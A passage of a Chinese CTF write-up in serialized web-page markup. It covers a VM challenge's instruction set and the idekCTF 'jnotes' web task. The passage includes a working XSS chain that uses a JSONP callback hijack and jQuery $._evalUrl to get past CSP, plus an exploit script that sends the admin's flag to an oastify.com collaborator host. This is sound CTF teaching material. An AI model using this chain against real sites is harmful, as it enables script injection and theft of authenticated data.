class=\"x-inline-highlight\">\\x07</code>的第二个操作数是寄存器编号；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">\\x08</code>从测试的回显来看是无操作数指令，发现当<code class=\"x-inline-highlight\">R0</code>大于<code class=\"x-inline-highlight\">4</code>时会报错<code class=\"x-inline-highlight\">unknown syscall</code>，判断是<code class=\"x-inline-highlight\">syscall</code>指令；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"..."}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"推理过程没有写的特别细致（sorry），最终得到的指令集如下："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"Instructions:\n\n\\x00: 0 opt(s),             halt\n\\x01: 1 opt(s), data        push (imm)\n\\x02: 1 opt(s), Rx          pop  (Rx)\n\\x03: 1 opt(s), Rx          push (Rx)\n\\x04: 1 opt(s), Rx          or   (Rx)       => R0 |= Rx\n\\x05: 1 opt(s), Rx          xor  (Rx)       => R0 ^= Rx\n\\x06: 2 opt(s), Rx, addr    load (Rx, data) => Rx = mem[addr]\n\\x07: 2 opt(s), addr, Rx    store(addr, Rx) => mem[addr] = Rx\n\n\\x08: 0 opt(s),             syscall\n                            R0         R1     R2     R3\n                            0: read   (fd,    addr,  size)\n                            1: write  (fd,    addr,  size)\n                            2: open   (path,  flags)\n                            3: close  (fd)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"Instructions:\n\n\\x00: 0 opt(s),             halt\n\\x01: 1 opt(s), data        push (imm)\n\\x02: 1 opt(s), Rx          pop  (Rx)\n\\x03: 1 opt(s), Rx          push (Rx)\n\\x04: 1 opt(s), Rx          or   (Rx)       => R0 |= Rx\n\\x05: 1 opt(s), Rx          xor  (Rx)       => R0 ^= Rx\n\\x06: 2 opt(s), Rx, addr    load (Rx, data) => Rx = mem[addr]\n\\x07: 2 opt(s), addr, Rx    store(addr, Rx) => mem[addr] = Rx\n\n\\x08: 0 opt(s),             syscall\n                            R0         R1     R2     R3\n                            0: read   (fd,    addr,  size)\n                            1: write  (fd,    addr,  size)\n                            2: open   (path,  flags)\n                            3: close  (fd)\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"读出flag"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"系统调用号和参数含义（从<code class=\"x-inline-highlight\">R1</code>开始传）是一致于Linux的。拿flag的思路是利用运算指令绕过过滤，构造出<code class=\"x-inline-highlight\">flag.txt</code>字符串，然后<code class=\"x-inline-highlight\">open</code>文件，<code class=\"x-inline-highlight\">read</code>内容到内存，最后用<code class=\"x-inline-highlight\">write</code>输出。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$12"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$13"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"idekCTF/web/jnotes（赛后）"}],["$","h3",null,{"className":"x-h2","children":"题目文件"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"展示几个涉及到的关键文件："}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">server.js</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$14"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$15"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">views/index.ejs</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<html>\n\n<head>\n    <link rel=\"stylesheet\" href=\"/style.css\">\n    <script src=\"https://code.jquery.com/jquery-3.7.1.js\"\n        integrity=\"sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=\" crossorigin=\"anonymous\">\n    </script>\n</head>\n\n<h1>Post a <em>JNote</em></h1>\n<form id=\"noteForm\">\n    <h2>Title</h2>\n    <input id=\"noteTitle\" name=\"noteTitle\" placeholder=\"title\" size=\"50\" />\n    </br>\n    <h2>Content</h2>\n    <input id=\"noteContent\" name=\"noteContent\" placeholder=\"content\" size=\"50\"></input>\n    </br>\n    </br>\n    <input type=\"submit\" value=\"Post\" />\n</form>\n<p id=\"message\"></p>\n\n<footer>\n    <script src=\"/index.js\"></script>\n</footer>\n\n</html>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$16"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">views/notes.ejs</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<html>\n\n<head>\n    <meta http-equiv=\"Content-Security-Policy\"\n        content=\"default-src 'none'; script-src 'self' https://code.jquery.com/jquery-3.7.1.js; connect-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;\">\n    <link rel=\"stylesheet\" href=\"/style.css\">\n    <script src=\"https://code.jquery.com/jquery-3.7.1.js\"\n        integrity=\"sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=\" crossorigin=\"anonymous\">\n    </script>\n    <script src=\"/view.js\"></script>\n</head>\n\n<body>\n    <script defer src=\"/api/view/<%= note %>?callback=showNote\"></script>\n    <div id=\"noteElement\">\n        <h1 id=\"noteTitle\"></h1>\n        <p id=\"noteContent\"></p>\n    </div>\n</body>\n\n</html>\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 144px, transparent 144px, transparent 336px, var(--bg-transparent-golden) 336px 360px, transparent 360px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$17"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">public/view.js</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"function showNote(note) {\n    titleElement = $(\"#noteTitle\");\n    contentElement = $(\"#noteContent\");\n    titleElement.text(note[\"noteTitle\"]);\n    contentElement.html(note[\"noteContent\"]);\n};\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$18"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"题目概览"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"题目是一个笔记应用，允许用户发送HTML笔记，笔记的内容通过<code class=\"x-inline-highlight\">contentElement.html(note[\"noteContent\"])</code>展示，最终需要XSS带外Admin Bot对<code class=\"x-inline-highlight\">/api/flag</code>的请求。Admin Bot的cookie是httpOnly的。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"笔记展示页面<code class=\"x-inline-highlight\">/note/...</code>有CSP限制，可利用的点几乎只有<code class=\"x-inline-highlight\">script-src 'self'</code>；<code class=\"x-inline-highlight\">index</code>页面则没有CSP。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"题目的后端是Express，前端引入了jQuery，并且对<code class=\"x-inline-highlight\">/api/view/...</code>的请求会返回一个JSONP格式的响应，本题就是需要用jQuery和JSONP组合来实现XSS。（框架都是最新版，不是Nday利用的题目。）"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Admin Bot可以访问输入的任何URL，因此允许我们构造一个攻击页面并发送给Bot。"}}],["$","h3",null,{"className":"x-h2","children":"前期思路"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"首先，看到Express中处理JSONP的<a href=\"https://github.com/expressjs/express/blob/master/lib/response.js#L267-L311\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">源码</a>：<code class=\"x-inline-highlight\">callback = callback.replace(/[^\\[\\]\\w&#36;.]/g, '');</code>，这里只允许使用<code class=\"x-inline-highlight\">A-Za-z0-9[].&#36;</code>这些字符，无法通过在<code class=\"x-inline-highlight\">callback</code>中插入特殊字符进行注入。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">notes.ejs</code>中使用JSONP的方式为<code class=\"x-inline-highlight\">src=\"/api/view/&#60;%= note %&#62;?callback=showNote\"</code>，可以通过访问<code class=\"x-inline-highlight\">/note/anything%3fcallback=alert%23</code>来触发<code class=\"x-inline-highlight\">alert</code>，原理是替换进模板后引入的<code class=\"x-inline-highlight\">src</code>会变成<code class=\"x-inline-highlight\">src=\"/api/view/anything?callback=alert#?callback=showNote\"</code>。我们可以通过这个操作实现执行任意函数，比如："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">alert</code>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">console.log</code>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">document.firstElementChild.nextElementSibling.click</code>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">document.forms[0].submit</code>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"..."}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"但可惜的是无法控制参数，当传入一个非法/不存在的<code class=\"x-inline-highlight\">note_id</code>时，相当于对这个函数进行空参调用；当传入一个合法的<code class=\"x-inline-highlight\">note_id</code>时，相当于有一个参数<code class=\"x-inline-highlight\">notes.get(req.params.note)</code>，但这个参数仅当调用<code class=\"x-inline-highlight\">showNote</code>时才有意义。（或者用<code class=\"x-inline-highlight\">console.log</code>打印出来这个对象 ^v^）"}}],["$","h3",null,{"className":"x-h2","children":"Official Solution"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"官方解法的思路是构造一个攻击页面，通过<code class=\"x-inline-highlight\">iframe</code>加载<code class=\"x-inline-highlight\">index</code>页面（没有CSP），然后想办法在<code class=\"x-inline-highlight\">index</code>页面中定义并执行<code class=\"x-inline-highlight\">showNote</code>函数。官方解法需要一些条件/特性："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"首先注意到<code class=\"x-inline-highlight\">index.ejs</code>和<code class=\"x-inline-highlight\">notes.ejs</code>中都有<code class=\"x-inline-highlight\">id=\"noteContent\"</code>的元素（一个是<code class=\"x-inline-highlight\">input</code>，一个是<code class=\"x-inline-highlight\">p</code>），这样保证了在<code class=\"x-inline-highlight\">index</code>页面中执行<code class=\"x-inline-highlight\">showNote</code>时仍然可以设置<code class=\"x-inline-highlight\">#noteContent</code>元素的HTML内容；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"jQuery的<code class=\"x-inline-highlight\">$.ajax(url)</code>在空参调用时，会默认使用<code class=\"x-inline-highlight\">location.href</code>作为<code class=\"x-inline-highlight\">url</code>；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"jQuery中有一个函数<code class=\"x-inline-highlight\">$._evalUrl(url)</code>，可以解析执行<code class=\"x-inline-highlight\">url</code>返回的JavaScript代码："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"jQuery._evalUrl = function (url, options, doc) {\n    return jQuery.ajax({\n        url: url,\n\n        // Make this explicit, since user can override this through ajaxSetup (trac-11264)\n        type: \"GET\",\n        dataType: \"script\",\n        cache: true,\n        async: false,\n        global: false,\n\n        // Only evaluate the response if it is successful (gh-4126)\n        // dataFilter is not invoked for failure responses, so using it instead\n        // of the default converter is kludgy but it works.\n        converters: {\n            \"text script\": function () {\n            }\n        },\n        dataFilter: function (response) {\n            jQuery.globalEval(response, options, doc);\n        }\n    });\n};\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$19"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"尽管我们不能控制<code class=\"x-inline-highlight\">url</code>参数，注意到<code class=\"x-inline-highlight\">jQuery._evalUrl</code>是使用<code class=\"x-inline-highlight\">jQuery.ajax</code>的，因此空参调用时会解析并执行<code class=\"x-inline-highlight\">location.href</code>，我们需要<code class=\"x-inline-highlight\">location.href</code>指向一个返回JavaScript代码的URL。"}}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">server.js</code>中的路由："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"/* index */\napp.use(\"*path\", (req, res) => {\n    return res.render(\"index\");\n});\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token comment\">/* index */</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*path\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"index\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"会在其他路由均失配时默认返回<code class=\"x-inline-highlight\">index</code>页面。"}}]]}]]}],["$","h4",null,{"className":"x-h3","children":"Step 1"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"首先，在攻击页面中创建这样一个<code class=\"x-inline-highlight\">iframe</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<iframe srcdoc=\"\n    <form method='POST' action='{{target}}/view.js'>\n    <script>\n        document.forms[0].submit();\n    </script>\n\"></iframe>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">srcdoc</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>\n    &lt;form method='POST' action='{{target}}/view.js'>\n    &lt;script>\n        document.forms[0].submit();\n    &lt;/script>\n<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"我使用Flask作为托管攻击页面的服务器，<code class=\"x-inline-highlight\">target</code>在这里是这道题目的地址。这个<code class=\"x-inline-highlight\">iframe</code>通过POST方法请求加载<code class=\"x-inline-highlight\">/view.js</code>，这会导致定义的路由均失配，最终匹配到<code class=\"x-inline-highlight\">*path</code>并返回<code class=\"x-inline-highlight\">index</code>页面；并且这个页面的<code class=\"x-inline-highlight\">location.href</code>会变成<code class=\"x-inline-highlight\">/view.js</code>："}}],["$","$L1a",null,{"src":"1.jpg","filterDarkTheme":true}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"（如果不用<code class=\"x-inline-highlight\">srcdoc</code>而是<code class=\"x-inline-highlight\">src=\".../view.js\"</code>，则会返回纯文本的JavaScript代码内容，这样就没有办法加载<code class=\"x-inline-highlight\">index</code>页面了。）"}}],["$","h4",null,{"className":"x-h3","children":"Step 2"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"现在<code class=\"x-inline-highlight\">index</code>页面中有我们需要的jQuery库和<code class=\"x-inline-highlight\">#noteContent</code>元素，但是<code class=\"x-inline-highlight\">showNote</code>函数是未定义的，而这个函数就是定义在<code class=\"x-inline-highlight\">/view.js</code>中。因此我们上一步将第一个<code class=\"x-inline-highlight\">iframe</code>的<code class=\"x-inline-highlight\">location.href</code>操作成<code class=\"x-inline-highlight\">/view.js</code>，就是为了这一步空参调用<code class=\"x-inline-highlight\">$._evalUrl</code>做铺垫。空参调用时默认使用<code class=\"x-inline-highlight\">location.href</code>做参数，也就会解析执行我们需要的<code class=\"x-inline-highlight\">/view.js</code>了。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"现在在攻击页面中添加下面的代码："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<script>\n    const iframe2 = document.createElement(\"iframe\");\n    iframe2.src = \"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\";\n    document.body.appendChild(iframe2);\n</script>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1b"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"利用前面提到的劫持<code class=\"x-inline-highlight\">callback</code>的方法，通过引入第二个<code class=\"x-inline-highlight\">iframe</code>，相当于执行了<code class=\"x-inline-highlight\">top.frames[0].$._evalUrl()</code>。（注意传入的<code class=\"x-inline-highlight\">note_id</code>是<code class=\"x-inline-highlight\">\"anything\"</code>，后端并不会匹配到合法的<code class=\"x-inline-highlight\">note</code>对象。）"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这个操作实际上是在第一个<code class=\"x-inline-highlight\">iframe</code>中定义了<code class=\"x-inline-highlight\">showNote</code>函数。"}}],["$","h4",null,{"className":"x-h3","children":"Step 3"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"回顾一下我们目前做了什么：我们的第一个<code class=\"x-inline-highlight\">iframe</code>页面是与<code class=\"x-inline-highlight\">target</code>同源的，也加载了jQuery库，并且也有<code class=\"x-inline-highlight\">#noteContent</code>元素；我们通过引入第二个<code class=\"x-inline-highlight\">iframe</code>触发JSONP，间接地在第一个<code class=\"x-inline-highlight\">iframe</code>中完成了对<code class=\"x-inline-highlight\">showNote</code>函数的定义。重要的是，第一个<code class=\"x-inline-highlight\">iframe</code>页面中是没有CSP限制的，因此我们可以在这个页面中渲染恶意笔记，触发XSS。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"我们在Flask服务端代码中创建一个笔记，并把<code class=\"x-inline-highlight\">note_id</code>保存下来，传给模板："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"<img src=x onerror='alert(0)'>\"\nresp = requests.post(target + \"/api/post\", json={\"noteContent\": payload, \"noteTitle\": \"anything\"})\nnote_id = resp.json()[\"id\"]\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1c"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<script>\n    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));\n    (async () => {\n        await sleep(5000);\n        const iframe2 = document.createElement(\"iframe\");\n        iframe2.src = \"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\";\n        document.body.appendChild(iframe2);\n\n        await sleep(1000);\n        const iframe3 = document.createElement(\"iframe\");\n        iframe3.src = \"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23\";\n        document.body.appendChild(iframe3);\n    })();\n</script>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1d"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这次我们通过引入第三个<code class=\"x-inline-highlight\">iframe</code>触发JSONP，间接地在第一个<code class=\"x-inline-highlight\">iframe</code>中执行了<code class=\"x-inline-highlight\">showNote</code>函数，渲染了包含<code class=\"x-inline-highlight\">payload</code>的笔记内容，实现了XSS。为了保证正确的执行顺序，在加载每个<code class=\"x-inline-highlight\">iframe</code>前加入了延时。"}}],["$","h4",null,{"className":"x-h3","children":"Step 4"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"正式利用时需要对<code class=\"x-inline-highlight\">payload</code>稍作修改，引入带外逻辑；同时由于<code class=\"x-inline-highlight\">cookie</code>是没有<code class=\"x-inline-highlight\">SameSite=None</code>的，因此直接在<code class=\"x-inline-highlight\">iframe</code>中访问<code class=\"x-inline-highlight\">/api/flag</code>时是没有<code class=\"x-inline-highlight\">cookie</code>的，需要通过<code class=\"x-inline-highlight\">window.open</code>打开一个新窗口来访问。"}}],["$","h4",null,{"className":"x-h3","children":"完整代码"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"最终的攻击页面代码如下："}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">index.html</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>Exploit</title>\n</head>\n<body>\n<iframe srcdoc=\"\n    <form method='POST' action='{{target}}/view.js'>\n    <script>\n        document.forms[0].submit();\n    </script>\n\"></iframe>\n<script>\n    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));\n    (async () => {\n        await sleep(5000);\n        const iframe2 = document.createElement(\"iframe\");\n        iframe2.src = \"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\";\n        document.body.appendChild(iframe2);\n\n        await sleep(1000);\n        const iframe3 = document.createElement(\"iframe\");\n        iframe3.src = \"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23\";\n        document.body.appendChild(iframe3);\n    })();\n</script>\n</body>\n</html>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1e"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">exp.py</code>："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"from flask import Flask, render_template\nimport requests\n\ntarget = \"https://jnotes-web.chal.idek.team\"\n\npayload = \"\"\"<img src=x onerror='\n    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));\n    const tab = window.open(`/api/flag`);\n    sleep(3000).then(() => fetch(\"//ta7dkoi5sodij8u1k6eft29ybphg56tv.oastify.com/?flag=\" + tab.document.body.innerText));\n'>\"\"\"\n\nresp = requests.post(target + \"/api/post\", json={\"noteContent\": payload, \"noteTitle\": \"anything\"})\nnote_id = resp.json()[\"id\"]\nprint(note_id)\n\napp = Flask(__name__, template_folder=\".\")\n\n\n@app.route(\"/\")\ndef index():\n    return render_template(\"index.html\", target=target, note_id=note_id)\n\n\napp.run(\"0.0.0.0\", 5003)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1f"}}]}]]}],["$","$L1a",null,{"src":"2.jpg","filterDarkTheme":true}],["$","h3",null,{"className":"x-h2","children":"Community Solution"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"首先除了通过<code class=\"x-inline-highlight\">/note/anything%3fcallback=alert%23</code>来触发<code class=\"x-inline-highlight\">alert</code>，还有一种方法是设置笔记的内容为："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<iframe srcdoc='<script src=\"/api/view/anything?callback=alert\"></script>'></iframe>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">srcdoc</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>&lt;script src=\"/api/view/anything?callback=alert\">&lt;/script><span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"然后正常访问这个笔记（<code class=\"x-inline-highlight\">/note/...</code>）就会触发<code class=\"x-inline-highlight\">alert</code>；因此后面我想通过<code class=\"x-inline-highlight\">a</code>标签的<code class=\"x-inline-highlight\">href</code>带外，因为通过JSONP可以触发点击事件，但是在<code class=\"x-inline-highlight\">iframe</code>中的<code class=\"x-inline-highlight\">a</code>标签点击时会被CSP限制："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"Refused to frame '...' because it violates the following Content Security Policy directive: \"default-src 'none'\". Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"Refused to frame '...' because it violates the following Content Security Policy directive: \"default-src 'none'\". Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"我一直以为这个是无法绕过的，但其实只需要给<code 